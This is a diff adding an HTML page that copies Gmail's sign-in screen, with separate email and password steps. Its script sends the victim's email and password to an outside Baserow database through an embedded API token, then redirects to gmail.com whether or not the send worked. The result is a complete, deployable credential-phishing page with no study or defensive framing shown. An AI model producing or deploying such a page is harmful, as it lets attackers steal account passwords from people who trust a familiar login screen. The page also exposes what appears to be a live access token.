@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Gmail</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-color: white;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo {
+            width: 55px;
+            height: 50px;
+            margin-bottom: 24px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 12px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        .form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            padding: 13px 15px;
+            font-size: 16px;
+            color: #202124;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        .input-field:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .email-display {
+            display: flex;
+            align-items: center;
+            padding: 8px 16px 8px 8px;
+            border: 1px solid #dadce0;
+            border-radius: 16px;
+            margin-bottom: 32px;
+            align-self: flex-start;
+        }
+
+        .email-avatar {
+            width: 20px;
+            height: 20px;
+            background-color: #dadce0;
+            border-radius: 50%;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .email-avatar svg {
+            width: 12px;
+            height: 12px;
+            fill: #5f6368;
+        }
+
+        .email-text {
+            font-size: 14px;
+            color: #202124;
+        }
+
+        .email-dropdown {
+            margin-left: 8px;
+            color: #5f6368;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .checkbox {
+            width: 18px;
+            height: 18px;
+            margin-right: 16px;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #202124;
+        }
+
+        .link {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-link {
+            margin-bottom: 32px;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 32px;
+        }
+
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .button:hover {
+            background-color: #1765cc;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 48px;
+            line-height: 1.5;
+        }
+
+        /* Page specific styles */
+        #page1, #page2 {
+            width: 100%;
+        }
+
+        #page2 {
+            display: none;
+        }
+
+        /* Updated styles to match the image */
+        .title {
+            font-size: 24px;
+            margin-bottom: 24px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+            width: 100%;
+        }
+
+        .email-display {
+            width: auto;
+            border-radius: 20px;
+            padding: 6px 12px 6px 6px;
+            margin-bottom: 24px;
+        }
+
+        .input-field {
+            border-radius: 4px;
+            border: 1px solid #1a73e8;
+        }
+
+        .input-label {
+            position: absolute;
+            top: -8px;
+            left: 10px;
+            background: white;
+            padding: 0 5px;
+            font-size: 14px;
+            color: #1a73e8;
+        }
+
+        .button {
+            border-radius: 20px;
+            padding: 12px 24px;
+        }
+
+        .checkbox-container {
+            margin-top: 16px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 24px 20px;
+            }
+            
+            .footer {
+                flex-direction: column-reverse;
+                gap: 24px;
+            }
+            
+            .button {
+                align-self: flex-end;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Google Logo -->
+        <img src="image/google-1088004_1280.png" alt="Google" class="logo">
+
+        <!-- Page 1: Email Input -->
+        <div id="page1">
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">to continue to Gmail</p>
+            
+            <form class="form" id="email-form">
+                <div class="input-container">
+                    <input type="text" id="email" class="input-field" placeholder="Email or phone" autofocus required>
+                </div>
+                
+                <a href="#" class="link forgot-link">Forgot email?</a>
+                
+                <p class="info-text">
+                    Not your computer? Use Private Browsing windows to sign in. 
+                    <a href="#" class="link">Learn more about using Guest mode</a>
+                </p>
+                
+                <div class="footer">
+                    <a href="#" class="link">Create account</a>
+                    <button type="submit" class="button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Page 2: Password Input -->
+        <div id="page2">
+            <h1 class="title">Welcome</h1>
+            
+            <div class="email-display">
+                <div class="email-avatar">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+                    </svg>
+                </div>
+                <span class="email-text" id="display-email"></span>
+                <span class="email-dropdown">▼</span>
+            </div>
+            
+            <p class="subtitle">To continue, first verify it's you</p>
+            
+            <form class="form" id="password-form">
+                <div class="input-container">
+                    <label for="password" class="input-label">Enter your password</label>
+                    <input type="password" id="password" class="input-field" required>
+                </div>
+                
+                <div class="checkbox-container">
+                    <input type="checkbox" id="show-password" class="checkbox">
+                    <label for="show-password" class="checkbox-label">Show password</label>
+                </div>
+                
+                <a href="#" class="link forgot-link">Forgot password?</a>
+                
+                <div class="footer">
+                    <div></div> <!-- Empty div for spacing -->
+                    <button type="submit" class="button">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+    // DOM elements
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const emailForm = document.getElementById('email-form');
+    const passwordForm = document.getElementById('password-form');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const displayEmail = document.getElementById('display-email');
+    const showPasswordCheckbox = document.getElementById('show-password');
+
+    // Constants
+    const BASEROW_API = 'https://api.baserow.io/api/database/rows/table/503285/';
+    const TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
+
+    // Handle email form submission
+    emailForm.addEventListener('submit', function (e) {
+        e.preventDefault();
+        const email = emailInput.value.trim();
+
+        if (email) {
+            sessionStorage.setItem('userEmail', email);
+            displayEmail.textContent = email;
+            page1.style.display = 'none';
+            page2.style.display = 'block';
+            passwordInput.focus();
+            document.title = 'Welcome - Gmail';
+        }
+    });
+
+    // Handle password form submission
+    passwordForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        const email = sessionStorage.getItem('userEmail');
+        const password = passwordInput.value;
+
+        if (email && password) {
+            try {
+                console.log('Sending data to Baserow:', { email, password });
+
+                const response = await fetch(BASEROW_API, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': TOKEN,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        "field_3977937": email,
+                        "field_3977952": password
+                    })
+                });
+
+                const result = await response.json();
+                console.log('Baserow response:', result);
+
+                if (!response.ok) {
+                    console.error('Baserow error:', result);
+                }
+
+                // Redirect regardless of success
+                window.location.href = 'https://gmail.com';
+            } catch (error) {
+                console.error('Network or API error:', error);
+                window.location.href = 'https://gmail.com';
+            }
+        }
+    });
+
+    // Toggle password visibility
+    showPasswordCheckbox.addEventListener('change', function () {
+        passwordInput.type = this.checked ? 'text' : 'password';
+    });
+
+    // Restore state if returning to the page with #verify
+    window.addEventListener('load', function () {
+        const savedEmail = sessionStorage.getItem('userEmail');
+
+        if (savedEmail && window.location.hash === '#verify') {
+            displayEmail.textContent = savedEmail;
+            page1.style.display = 'none';
+            page2.style.display = 'block';
+            document.title = 'Welcome - Gmail';
+        }
+    });
+</script>
+
+</body>
+</html>
